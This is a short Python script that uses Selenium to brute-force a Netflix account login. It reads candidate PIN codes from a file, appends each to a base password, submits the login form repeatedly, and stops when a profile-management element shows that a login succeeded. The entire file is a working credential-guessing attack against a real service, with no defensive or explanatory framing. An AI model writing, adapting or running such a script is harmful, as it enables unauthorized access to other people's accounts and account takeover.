from selenium import webdriver

#Generating all pin codes
pin_list = []
with open('pinCodes.txt', 'r') as f:
    pin_list=[word for line in f for word in line.split()]

#Credentials
url = 'https://www.netflix.com/ca/login'
username = ''
password = ''
#Properties
#Link to web drivers = 'https://chromedriver.storage.googleapis.com/index.html?path=2.38/'
driver = webdriver.Chrome('/home/aazhar/Downloads/chromedriver')

password_used = ''

for i in range(len(pin_list)):
    
    driver.get(url)
    login_field = driver.find_element_by_name('userLoginId')
    password_field = driver.find_element_by_name('password')
    submit_button = driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
    brute_pass = password + pin_list[i]
   
    try:
        login_field.send_keys(username)
        password_used = brute_pass
        password_field.send_keys(password_used)
        submit_button.click()
        #if manage_profiles raise no exception -> log in Successful
        manage_profiles = driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/span/a')
        break
    except Exception:
        continue

print("Stopped at: " + password_used)